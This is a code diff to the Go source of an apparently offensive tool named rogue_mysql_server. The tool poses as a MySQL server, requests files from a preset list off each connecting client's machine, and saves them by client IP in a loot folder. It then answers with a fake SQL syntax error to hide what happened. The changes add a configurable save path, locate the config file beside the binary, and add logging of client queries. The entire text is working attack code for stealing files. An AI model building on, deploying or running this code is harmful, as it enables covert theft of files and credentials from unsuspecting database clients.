@@ -8,6 +8,7 @@ import (
 	"gopkg.in/yaml.v2"
 	"io/ioutil"
 	"os"
+	"path/filepath"
 	"rogue_mysql_server/mysql"
 	"strings"
 	"sync"
@@ -31,6 +32,7 @@ type Config struct {
 	Auth     bool     `yaml:"auth"`
 	Username string   `yaml:"username"`
 	Password string   `yaml:"password"`
+	Savepath string   `yaml:"savepath"`
 }
 
 func NativePassword(password string) string {
@@ -53,7 +55,8 @@ func NativePassword(password string) string {
 
 func main() {
 	config := Config{}
-	configData, err := ioutil.ReadFile("./config.yaml")
+	cwd, _ := filepath.Abs(filepath.Dir(os.Args[0]))
+	configData, err := ioutil.ReadFile(fmt.Sprintf("%s/%s", cwd, "config.yaml"))
 
 	if err != nil {
 		log.Errorf("Config read error: %s", err)
@@ -100,7 +103,7 @@ func main() {
 
 // NewConnection is part of the mysql.Handler interface.
 func (db *DB) NewConnection(c *mysql.Conn) {
-	log.Infof("New connection from [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
+	log.Infof("New client from addr [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
 	db.mapLock.Lock()
 	db.fileIndex[c.ConnectionID] = 0
 	db.mapLock.Unlock()
@@ -108,7 +111,7 @@ func (db *DB) NewConnection(c *mysql.Conn) {
 
 // ConnectionClosed is part of the mysql.Handler interface.
 func (db *DB) ConnectionClosed(c *mysql.Conn) {
-	log.Infof("Connection closed, Addr [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
+	log.Infof("Client leaved, Addr [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
 	db.mapLock.Lock()
 	delete(db.fileIndex, c.ConnectionID)
 	db.mapLock.Unlock()
@@ -116,6 +119,8 @@ func (db *DB) ConnectionClosed(c *mysql.Conn) {
 
 // ComQuery is part of the mysql.Handler interface.
 func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Result) error) error {
+	log.Infof("Client from addr [%s], ID [%d] try to query [%s]", c.RemoteAddr(), c.ConnectionID, query)
+
 	length := len(db.config.FileList)
 	if length == 0 {
 		return nil
@@ -125,18 +130,23 @@ func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Resu
 		db.fileIndex[c.ConnectionID] = (db.fileIndex[c.ConnectionID] + 1) % length
 		db.mapLock.Unlock()
 		data := c.RequestFile(filename)
-		log.Infof("Now try to read [%s] from [%s]", filename, c.RemoteAddr())
+		log.Infof("Now try to read file [%s] from addr [%s], ID [%d]", filename, c.RemoteAddr(), c.ConnectionID)
 
 		if data == nil || len(data) == 0 {
 			log.Infof("Read failed, file may not exist in client")
 		} else {
-			path := fmt.Sprintf("./loot/%s", strings.Split(c.RemoteAddr().String(), ":")[0])
-			os.Mkdir(path, 0744)
+			path := fmt.Sprintf("%s/%s", db.config.Savepath , strings.Split(c.RemoteAddr().String(), ":")[0])
+
+			if _, err := os.Stat(path); os.IsNotExist(err) {
+				os.MkdirAll(path, 0755)
+			}
+
 			filename := strings.Split(filename, "/")
 			filename = filename[len(filename)-1:]
-			filepath := fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), filename[0])
-			ioutil.WriteFile(filepath, data, 0644)
-			log.Infof("Read success, stored at [%s]", filepath)
+
+			path = fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), filename[0])
+			ioutil.WriteFile(path, data, 0644)
+			log.Infof("Read success, stored at [%s]", path)
 		}
 
 		c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
